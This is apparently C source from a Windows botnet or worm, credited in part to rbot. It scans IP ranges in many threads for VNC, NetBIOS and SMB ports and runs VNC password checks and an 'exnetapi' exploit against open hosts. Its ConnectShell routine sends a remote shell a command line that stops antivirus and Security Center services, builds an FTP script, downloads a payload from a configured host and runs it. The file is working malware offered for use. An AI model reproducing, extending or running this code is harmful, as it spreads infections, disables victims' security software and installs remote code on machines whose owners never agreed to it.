#include "include.h"

CRITICAL_SECTION CriticalSection;
unsigned long dwIP;

unsigned long GetNextIP(unsigned long CurrentIP) {
	DWORD host;
	memcpy(&host, &CurrentIP, 4);
	host = ntohl(host);
	host += 1;
	host = htonl(host);
	memcpy(&CurrentIP, &host, 4);
	return (CurrentIP);
}

unsigned long GetRandIP(char *IPMask)
{
	unsigned long IP;
	int ip1=-1,ip2=-1,ip3=-1,ip4=-1;

	sscanf(IPMask, "%d.%d.%d.%d", &ip1, &ip2, &ip3, &ip4);
	if (ip1==-1) ip1=rand();
	if (ip2==-1) ip2=rand();
	if (ip3==-1) ip3=rand();
	if (ip4==-1) ip4=rand();

	IP = (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));

	return (IP);
}

//Port scanner - taken out of rbot
BOOL AdvPortOpen(SOCKET sock, unsigned long ip, unsigned int port) {

	SOCKADDR_IN sin;
	unsigned long blockcmd=1;

	sock = socket(AF_INET,SOCK_STREAM,0);
	if (sock == INVALID_SOCKET) 
		return FALSE;

	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = ip;
	sin.sin_port = htons((unsigned short)port);
	ioctlsocket(sock,FIONBIO,&blockcmd);
	connect(sock,(LPSOCKADDR)&sin,sizeof(sin));

	TIMEVAL timeout;
	timeout.tv_sec=DEF_PORTSCAN_DELAY;
	timeout.tv_usec=0;
	FD_SET rset;
	FD_ZERO(&rset);
	FD_SET(sock,&rset);

	int i = select(0,0,&rset,0,&timeout);
	closesocket(sock);

	if (i<=0) 
		return FALSE;
	else 
		return TRUE;
}

//Particular scan thread
DWORD WINAPI ScanThread(LPVOID param) {

	IN_ADDR in;
	unsigned long CurrentIP;

	BOOL Port5900,Port139,Port445;

	SCANTHREAD scan = *((SCANTHREAD *)param);
	SCANTHREAD *scans = (SCANTHREAD *)param;
	scans->GotInfo = TRUE;

	while (1) {
        Port139 = FALSE;
		Port445 = FALSE;
		Port5900 = FALSE;

		//Get IP first
		EnterCriticalSection(&CriticalSection); 
		if (scan.Mode == 0)
			dwIP = GetNextIP(dwIP);
		else
			dwIP = GetRandIP(scan.IP);

		//Save to our local war
		CurrentIP = dwIP;
		LeaveCriticalSection(&CriticalSection); 

		in.s_addr = CurrentIP;
#ifdef DEBUG
		printf("Checking: %s\n", inet_ntoa(in));
#endif

#ifndef NO_VNC
		Port5900 = AdvPortOpen(Thread[scan.ThreadNum].Sock, CurrentIP, 5900);
		Port139 = AdvPortOpen(Thread[scan.ThreadNum].Sock, CurrentIP, 139);
		Port445 = AdvPortOpen(Thread[scan.ThreadNum].Sock, CurrentIP, 445);
#endif

#ifndef NO_VNC
		if (Port5900)
			VNCPassCheck(scan.Sock, inet_ntoa(in), scan.UseCFTP, TRUE);
#endif
	
		if (Port139)
			exnetapi (scan.Sock, inet_ntoa(in));
		if (Port445)
	        exnetapi (scan.Sock, inet_ntoa(in));
	}

	ClearThread(scan.ThreadNum);
	ExitThread(0);
}

//Thread for setting up scanning threads
DWORD WINAPI Scanner(LPVOID param) {

	unsigned int i;
	DWORD Id = 0;
	int RangeSize = 0;
	int ip1=-1,ip2=-1,ip3=-1,ip4=-1;

	SCANNER startscan = *((SCANNER *)param);
	SCANNER *startscans = (SCANNER *)param;
	startscans->GotInfo = TRUE;

#ifdef DEBUG
	printf("Main scan thread started.\n");
#endif

	DeleteCriticalSection(&CriticalSection);

	if (!InitializeCriticalSectionAndSpinCount(&CriticalSection, 0x80000400)) 
	{
		ClearThread(startscan.ThreadNum);
		ExitThread(0);
	}


	//Sequential scan
	if (startscan.Mode == 0) {
		sscanf(startscan.IP, "%d.%d.%d.%d", &ip1, &ip2, &ip3, &ip4);
		if (ip1==-1) ip1=rand();
		if (ip2==-1) ip2=rand();
		if (ip3==-1) ip3=rand();
		if (ip4==-1) ip4=rand();
		dwIP = (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));
	}

	SCANTHREAD scan;
	scan.Sock = startscan.Sock;
	scan.Mode = startscan.Mode;
	scan.UseCFTP = startscan.UseCFTP;
	scan.vncmode = startscan.vncmode;
	_snprintf(scan.IP, sizeof(scan.IP), startscan.IP);

	for (i = 0; i < startscan.Threads; i++) {
		
		scan.GotInfo = FALSE;
		scan.ThreadNum = AddThread(SCANT_THREAD);

		if (scan.ThreadNum > 0) {
			Thread[scan.ThreadNum].tHandle = CreateThread(0, 0, &ScanThread, (LPVOID)&scan, 0, 0);
			while (scan.GotInfo == FALSE)
				Sleep(30);
		}

		Sleep(50);
	}

	ClearThread(startscan.ThreadNum);
	ExitThread(0);
}
BOOL ConnectShell(char *ip, unsigned int connectport)
{

	char filename[_MAX_FNAME];
	int len;
	char recvbuf[1024];
	SOCKET sockfd;
	SOCKADDR_IN shell_addr;
	ZeroMemory(&shell_addr, sizeof(shell_addr));
	//_snprintf(Buffer, sizeof(Buffer), "Rooting via NTAPI: %s.", ip);
		//IrcPrivmsg(sock, TransferChannel, Buffer);
	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = *ip;
	shell_addr.sin_port = htons(connectport);
	
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return FALSE;
	if (connect(sockfd,(LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) 
		return FALSE;
//	IrcPrivmsg(sockfd, TransferChannel, Buffer);
	char mkdir_buff[400];

	len = recv(sockfd, recvbuf, 1024, 0);

	//char fname[_MAX_FNAME];
	sprintf(filename,"eraseme_%d%d%d%d%d.exe",rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
_snprintf(mkdir_buff,sizeof(mkdir_buff),"net stop \"AntiVir PersonalEdition Classic Guard\" &net stop \"Security Center\" &net stop \"Symantec AntiVirus\" &net stop \"Norton AntiVirus Server\" &net stop navapsvc &net stop kavsvc &net stop McAfeeFramework &net stop NOD32krn &net stop McShield &echo open %s %d > i&echo user %s %s >> i &echo get %s >> i &echo bye >> i &ftp -n -v -s:i &del i &%s &exit",CFTPHost, CFTPPort, CFTPUser, CFTPPass, CFTPPath, CFTPFile);

	//_snprintf(mkdir_buff, sizeof(mkdir_buff), "tftp -i %s get %s& start %s& exit", GetIP(sockfd), filename, filename); %/


	if (send(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return FALSE;

	Sleep(500);
	_snprintf(mkdir_buff, sizeof (mkdir_buff), "%s\r\n", filename);

	if (send(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return FALSE;

	len = recv(sockfd, recvbuf, 1024, 0);
	closesocket(sockfd);
	return TRUE;
}
